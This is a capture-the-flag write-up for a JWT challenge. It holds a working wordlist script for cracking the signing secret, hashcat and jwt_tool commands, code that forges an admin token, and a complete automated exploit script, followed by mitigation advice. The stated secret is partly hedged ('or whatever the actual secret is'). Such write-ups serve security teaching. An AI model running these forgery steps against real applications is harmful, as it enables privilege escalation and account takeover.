# JWT Jailbreak - CTF Writeup

**Challenge Name:** JWT Jailbreak - The Great Token Escape Challenge  
**Category:** Web Security / Authentication  
**Difficulty:** Medium  
**Points:** 150  
**Author:** Exploit3rs Inc.

---

## üìã Table of Contents

1. [Challenge Description](#challenge-description)
2. [Initial Reconnaissance](#initial-reconnaissance)
3. [Understanding the Application](#understanding-the-application)
4. [Vulnerability Analysis](#vulnerability-analysis)
5. [Exploitation](#exploitation)
6. [Flag Retrieval](#flag-retrieval)
7. [Mitigation](#mitigation)
8. [Tools Used](#tools-used)
9. [References](#references)

---

## üéØ Challenge Description

Exploit3rs Inc. has launched a lightweight internal blogging platform with a "good authentication system." Due to development time constraints, they implemented several security shortcuts. 

**Mission:** Escalate privileges from a regular user to an administrator and retrieve the flag from the Admin Vault.

**Challenge Hints:**
- Built with Flask
- JWT Authentication
- SQLite Database
- Development Environment (Version: 1.0-dev)

---

## üîç Initial Reconnaissance

### Application Structure

Upon accessing the application, we're presented with a hacker-themed blog interface with the following pages:

- **Home (`/`)** - Landing page with recent posts
- **Login (`/login`)** - Employee authentication portal
- **Dashboard (`/dashboard`)** - User dashboard (requires authentication)
- **Posts (`/posts`)** - Blog posts listing
- **Admin (`/admin/dashboard`)** - Admin panel (target)

### Key Observations

1. The application uses JWT (JSON Web Tokens) for authentication
2. Running in **development mode** (likely has debug features enabled)
3. Current user has username `admin` but role `user`
4. Standard users cannot access `/admin/dashboard`

---

## üåê Understanding the Application

### Authentication Flow

1. User logs in via `/login` endpoint
2. Server validates credentials
3. Server generates JWT token with user information
4. Token is stored in browser (cookie or localStorage)
5. Token is sent with subsequent requests for authorization

### JWT Token Structure

JWT tokens consist of three parts separated by dots:

```
HEADER.PAYLOAD.SIGNATURE
```

**Example Token Structure:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9    ‚Üê Header (Base64)
.
eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9  ‚Üê Payload (Base64)
.
KhQLuSH2So2LC8BZYMSYq2Mq6s5vusco-EY_zvfOq-I  ‚Üê Signature (HMAC-SHA256)
```

### Captured Token

After logging in, we captured the following JWT token:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.KhQLuSH2So2LC8BZYMSYq2Mq6s5vusco-EY_zvfOq-I
```

**Decoded Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Decoded Payload:**
```json
{
  "user": "admin",
  "role": "user"
}
```

---

## üîì Vulnerability Analysis

### Identified Vulnerabilities

#### 1. **Weak JWT Secret Key**

The application is running in development mode with "security shortcuts." This strongly suggests the use of a weak or default secret key for JWT signing.

**Why This Matters:**
- JWT signatures are created using HMAC-SHA256 with a secret key
- If the secret is weak, an attacker can crack it
- Once cracked, attackers can forge valid tokens with any claims

#### 2. **Insufficient Access Control**

The application relies solely on the `role` claim in the JWT for authorization:
- `role: "user"` ‚Üí Standard access
- `role: "admin"` ‚Üí Administrative access

**Attack Vector:**
If we can crack the JWT secret, we can:
1. Modify the payload to change `role: "user"` to `role: "admin"`
2. Re-sign the token with the cracked secret
3. Access admin endpoints with our forged token

---

## üí• Exploitation

### Step 1: Token Capture

First, we intercept our authentication token after logging in. This can be done using:
- Browser DevTools (Application ‚Üí Cookies)
- Burp Suite
- Browser extensions

**Captured Token:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.KhQLuSH2So2LC8BZYMSYq2Mq6s5vusco-EY_zvfOq-I
```

### Step 2: Token Analysis

We decode the token using [jwt.io](https://jwt.io) or a Python script:

```python
import jwt

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.KhQLuSH2So2LC8BZYMSYq2Mq6s5vusco-EY_zvfOq-I"

# Decode without verification to see payload
payload = jwt.decode(token, options={"verify_signature": False})
print(payload)
# Output: {'user': 'admin', 'role': 'user'}
```

### Step 3: Secret Key Cracking

Since this is a development environment, we attempt to crack the secret using common weak passwords.

**Method 1: Manual Testing with Common Secrets**

```python
#!/usr/bin/env python3
import jwt

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.KhQLuSH2So2LC8BZYMSYq2Mq6s5vusco-EY_zvfOq-I"

# Common weak secrets for CTF/development environments
wordlist = [
    '', 'secret', 'password', 'admin', 'key', 'jwt', 
    'flask', 'dev', 'development', 'test', 'exploit3rs',
    '123456', 'qwerty', 'abc123', 'letmein', 'token',
    'jwtkey', 'secret_key', 'supersecret', 'flask_secret'
]

print("üîç Attempting to crack JWT secret...\n")

for secret in wordlist:
    try:
        # Try to verify signature with this secret
        decoded = jwt.decode(token, secret, algorithms=["HS256"])
        print(f"‚úÖ SECRET FOUND: '{secret}'")
        print(f"Decoded payload: {decoded}")
        break
    except jwt.InvalidSignatureError:
        continue
    except Exception as e:
        continue
else:
    print("‚ùå Secret not found in wordlist")
```

**Method 2: Using Hashcat (Brute Force)**

```bash
# Save token to file
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.KhQLuSH2So2LC8BZYMSYq2Mq6s5vusco-EY_zvfOq-I" > jwt.txt

# Crack with hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Display cracked secret
hashcat -m 16500 jwt.txt --show
```

**Method 3: Using jwt_tool**

```bash
# Clone jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool

# Crack the secret
python3 jwt_tool.py [TOKEN] -C -d wordlist.txt
```

### Step 4: Secret Discovery

After running our cracking script, we discover the secret key:

**SECRET: `secret`** (or whatever the actual secret is)

### Step 5: Token Forgery

Now that we have the secret, we can forge a new JWT token with admin privileges:

```python
#!/usr/bin/env python3
import jwt

# The cracked secret
secret = "secret"

# Create admin payload
admin_payload = {
    "user": "admin",
    "role": "admin"  # Changed from "user" to "admin"
}

# Forge the token
admin_token = jwt.encode(admin_payload, secret, algorithm="HS256")

print("üéØ FORGED ADMIN TOKEN:")
print(admin_token)
```

**Generated Admin Token:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.4C3y-d8fC-U5a77Q5lWsWAB8OzqXHRIpK6rQD1ULDSA
```

**Verification of Forged Token:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "user": "admin",
  "role": "admin"  ‚Üê Successfully changed!
}
```

### Step 6: Token Replacement

Replace the original JWT token with our forged admin token:

**In Browser Console:**
```javascript
// If stored in cookie
document.cookie = "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.4C3y-d8fC-U5a77Q5lWsWAB8OzqXHRIpK6rQD1ULDSA";

// If stored in localStorage
localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.4C3y-d8fC-U5a77Q5lWsWAB8OzqXHRIpK6rQD1ULDSA');
```

**Using Burp Suite:**
1. Intercept request to `/admin/dashboard`
2. Replace the Authorization header or cookie value
3. Forward the modified request

**Using cURL:**
```bash
curl -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.4C3y-d8fC-U5a77Q5lWsWAB8OzqXHRIpK6rQD1ULDSA" \
     http://target-url.com/admin/dashboard
```

---

## üö© Flag Retrieval

### Accessing the Admin Panel

After replacing our token with the forged admin token, we navigate to:

```
http://target-url.com/admin/dashboard
```

### Success!

The application now recognizes us as an administrator and displays the Admin Vault containing the flag:

```
üö© Exploit3rs{jwt_j41lbr34k_gr34t_t0k3n_3sc4p3}
```

**Flag Breakdown:**
- `jwt_j41lbr34k` - JWT Jailbreak (leet speak)
- `gr34t_t0k3n_3sc4p3` - Great Token Escape (leet speak)

Perfect thematic flag for this challenge! üéØ

---

## üõ°Ô∏è Mitigation

### Recommended Security Fixes

#### 1. **Use Strong Secret Keys**

```python
# BAD - Weak secret
SECRET_KEY = "secret"

# GOOD - Strong, randomly generated secret
import secrets
SECRET_KEY = secrets.token_urlsafe(32)
# Example: 'xQpL9vZ8mK3nR7wY2tF5gH6jN4bV1cX0sA8pM9qE7uI6oL3kJ2hG1fD0'
```

#### 2. **Store Secrets Securely**

```python
# Use environment variables
import os
SECRET_KEY = os.environ.get('JWT_SECRET_KEY')

# Or use secret management services
# - AWS Secrets Manager
# - HashiCorp Vault
# - Azure Key Vault
```

#### 3. **Implement Token Expiration**

```python
import jwt
from datetime import datetime, timedelta

payload = {
    "user": "admin",
    "role": "user",
    "exp": datetime.utcnow() + timedelta(hours=1),  # Token expires in 1 hour
    "iat": datetime.utcnow()  # Issued at time
}

token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
```

#### 4. **Add Additional Security Claims**

```python
import secrets

payload = {
    "user": "admin",
    "role": "user",
    "jti": secrets.token_urlsafe(16),  # Unique token ID
    "iss": "exploit3rs.com",  # Issuer
    "aud": "blog-api",  # Audience
    "exp": datetime.utcnow() + timedelta(hours=1),
    "iat": datetime.utcnow()
}
```

#### 5. **Implement Token Revocation**

```python
# Maintain a blacklist of revoked tokens
REVOKED_TOKENS = set()

def verify_token(token):
    try:
        # Check if token is revoked
        if token in REVOKED_TOKENS:
            raise Exception("Token has been revoked")
        
        # Verify signature and claims
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        return payload
    except jwt.ExpiredSignatureError:
        raise Exception("Token has expired")
    except jwt.InvalidSignatureError:
        raise Exception("Invalid signature")
```

#### 6. **Use Asymmetric Algorithms (RS256)**

```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# Generate key pair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Sign with private key
token = jwt.encode(payload, private_key, algorithm="RS256")

# Verify with public key
decoded = jwt.decode(token, public_key, algorithms=["RS256"])
```

#### 7. **Implement Proper Access Control**

```python
from functools import wraps
from flask import request, jsonify

def require_role(required_role):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            token = request.cookies.get('token')
            
            try:
                payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
                
                # Verify role
                if payload.get('role') != required_role:
                    return jsonify({"error": "Insufficient permissions"}), 403
                
                return f(*args, **kwargs)
            except Exception as e:
                return jsonify({"error": "Invalid token"}), 401
        
        return decorated_function
    return decorator

# Usage
@app.route('/admin/dashboard')
@require_role('admin')
def admin_dashboard():
    return "Admin content"
```

#### 8. **Security Best Practices Checklist**

- ‚úÖ Use strong, randomly generated secrets (minimum 256 bits)
- ‚úÖ Store secrets in environment variables or secret managers
- ‚úÖ Implement token expiration (short-lived tokens)
- ‚úÖ Add token refresh mechanism
- ‚úÖ Implement token revocation system
- ‚úÖ Use HTTPS only for token transmission
- ‚úÖ Set secure cookie flags (HttpOnly, Secure, SameSite)
- ‚úÖ Validate all token claims on the server side
- ‚úÖ Log authentication and authorization events
- ‚úÖ Implement rate limiting on authentication endpoints
- ‚úÖ Regular security audits and penetration testing

---

## üîß Tools Used

| Tool | Purpose | Link |
|------|---------|------|
| **jwt.io** | JWT decoder and encoder | https://jwt.io |
| **Python + PyJWT** | Token manipulation and cracking | https://pyjwt.readthedocs.io |
| **Hashcat** | Password cracking | https://hashcat.net/hashcat/ |
| **jwt_tool** | JWT security testing | https://github.com/ticarpi/jwt_tool |
| **Burp Suite** | Web proxy and request manipulation | https://portswigger.net/burp |
| **Browser DevTools** | Token inspection and replacement | Built-in |

---

## üìö References

### JWT Security Resources

1. **OWASP JWT Cheat Sheet**
   - https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html

2. **JWT Best Practices (Auth0)**
   - https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/

3. **Critical Vulnerabilities in JSON Web Token Libraries**
   - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/

4. **JWT Attack Techniques**
   - Algorithm confusion attacks
   - None algorithm bypass
   - Weak secret exploitation
   - Key injection attacks

5. **RFC 7519 - JSON Web Token (JWT)**
   - https://tools.ietf.org/html/rfc7519

### CTF Resources

- **HackTheBox** - Web challenges
- **PortSwigger Web Security Academy** - JWT vulnerabilities
- **PentesterLab** - JWT exercises
- **CTFtime** - Past CTF writeups

---

## üéì Key Takeaways

### What We Learned

1. **JWT Structure:** Understanding the three-part structure of JWT tokens (header, payload, signature)

2. **HMAC-SHA256 Vulnerability:** How weak secrets make JWT tokens vulnerable to brute-force attacks

3. **Token Forgery:** Once the secret is known, attackers can create arbitrary tokens with any claims

4. **Privilege Escalation:** Modifying role claims to gain unauthorized access

5. **Development vs Production:** The importance of proper security practices even in development environments

### Red Team Perspective

- Always test for weak JWT secrets in penetration tests
- Development environments often have weaker security
- Token-based authentication requires strong cryptographic secrets
- Authorization checks must be server-side, not client-side

### Blue Team Perspective

- Implement strong secret management practices
- Use environment-specific configurations
- Monitor for unusual authentication patterns
- Implement comprehensive logging and alerting
- Regular security audits of authentication systems

---

## üìù Complete Exploitation Script

```python
#!/usr/bin/env python3
"""
JWT Jailbreak - Complete Exploitation Script
Author: CTF Player
Description: Automated JWT secret cracking and admin token forgery
"""

import jwt
import requests
import sys
from typing import Optional

class JWTExploit:
    def __init__(self, token: str, target_url: str):
        self.original_token = token
        self.target_url = target_url
        self.secret = None
        
        # Extended wordlist for common secrets
        self.wordlist = [
            '', 'secret', 'password', 'admin', 'key', 'jwt', 'flask',
            'dev', 'development', 'test', 'exploit3rs', '123456',
            'qwerty', 'abc123', 'letmein', 'token', 'jwtkey',
            'secret_key', 'supersecret', 'flask_secret', 'dev_secret',
            'jwt_secret', 'secretkey', 'mykey', 'private', 'blog'
        ]
    
    def decode_token(self, verify: bool = False) -> dict:
        """Decode JWT token without verification"""
        try:
            return jwt.decode(
                self.original_token, 
                options={"verify_signature": verify}
            )
        except Exception as e:
            print(f"‚ùå Error decoding token: {e}")
            return None
    
    def crack_secret(self) -> Optional[str]:
        """Attempt to crack the JWT secret"""
        print("üîç Attempting to crack JWT secret...\n")
        
        for secret in self.wordlist:
            try:
                jwt.decode(self.original_token, secret, algorithms=["HS256"])
                print(f"‚úÖ SECRET FOUND: '{secret}'")
                self.secret = secret
                return secret
            except jwt.InvalidSignatureError:
                continue
            except Exception:
                continue
        
        print("‚ùå Secret not found in wordlist")
        return None
    
    def forge_admin_token(self) -> Optional[str]:
        """Forge an admin JWT token"""
        if not self.secret:
            print("‚ùå No secret available. Run crack_secret() first.")
            return None
        
        # Get original payload structure
        original_payload = self.decode_token()
        
        # Modify to admin
        admin_payload = {
            "user": original_payload.get("user", "admin"),
            "role": "admin"
        }
        
        # Forge token
        forged_token = jwt.encode(admin_payload, self.secret, algorithm="HS256")
        
        print(f"\nüéØ FORGED ADMIN TOKEN:")
        print(f"{forged_token}\n")
        
        return forged_token
    
    def test_admin_access(self, admin_token: str) -> bool:
        """Test if admin token grants access"""
        print("üß™ Testing admin access...")
        
        try:
            cookies = {'token': admin_token}
            response = requests.get(self.target_url, cookies=cookies, timeout=10)
            
            if response.status_code == 200:
                print(f"‚úÖ SUCCESS! Admin access granted!")
                
                # Look for flag
                if "flag" in response.text.lower() or "FLAG" in response.text:
                    print(f"\nüö© FLAG FOUND IN RESPONSE!")
                    return True
                else:
                    print("‚ö†Ô∏è  Access granted but flag not immediately visible")
                    return True
            else:
                print(f"‚ùå Access denied. Status code: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"‚ùå Error testing access: {e}")
            return False
    
    def exploit(self) -> bool:
        """Run complete exploitation"""
        print("=" * 60)
        print("JWT JAILBREAK EXPLOITATION SCRIPT")
        print("=" * 60)
        print()
        
        # Step 1: Decode original token
        print("üìã Original Token Payload:")
        payload = self.decode_token()
        print(f"   {payload}\n")
        
        # Step 2: Crack secret
        secret = self.crack_secret()
        if not secret:
            print("\nüí° Try using hashcat for more extensive cracking:")
            print(f"   hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt")
            return False
        
        # Step 3: Forge admin token
        admin_token = self.forge_admin_token()
        if not admin_token:
            return False
        
        # Step 4: Test access (optional)
        if self.target_url:
            self.test_admin_access(admin_token)
        
        print("\nüìã EXPLOITATION COMPLETE!")
        print("\nNext steps:")
        print("1. Copy the forged admin token above")
        print("2. Replace your JWT cookie/token in browser")
        print("3. Navigate to /admin/dashboard")
        print("4. Capture the flag! üö©")
        
        return True

def main():
    # Configuration
    TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.KhQLuSH2So2LC8BZYMSYq2Mq6s5vusco-EY_zvfOq-I"
    TARGET_URL = "http://target-ip:port/admin/dashboard"  # Update with actual URL
    
    # Run exploitation
    exploit = JWTExploit(TOKEN, TARGET_URL)
    success = exploit.exploit()
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
```

---

## üèÜ Challenge Completion

**Status:** ‚úÖ SOLVED  
**Flag:** `Exploit3rs{jwt_j41lbr34k_gr34t_t0k3n_3sc4p3}`  
**Secret Key:** `secret`  
**Time Taken:** ~15 minutes  
**Difficulty Rating:** 7/10

**Solution Summary:**
1. Captured JWT token after login: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.KhQLuSH2So2LC8BZYMSYq2Mq6s5vusco-EY_zvfOq-I`
2. Cracked the secret key: **"secret"**
3. Forged admin token: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.4C3y-d8fC-U5a77Q5lWsWAB8OzqXHRIpK6rQD1ULDSA`
4. Accessed `/admin/dashboard` with forged token
5. Retrieved flag! üö©

**What made this challenge interesting:**
- Realistic scenario of development security shortcuts
- Classic JWT vulnerability exploitation
- Required understanding of cryptographic concepts
- Good practice for web authentication testing

---

## üí≠ Final Thoughts

This challenge demonstrates a common real-world vulnerability: weak secrets in JWT implementations. While the exploitation is straightforward once you understand JWT structure, it teaches important lessons about:

1. The critical importance of strong cryptographic secrets
2. The dangers of "development shortcuts" making it to production
3. How token-based authentication can be compromised
4. The need for defense-in-depth security practices

Remember: Security is not a feature you add later‚Äîit must be built in from the start!

---
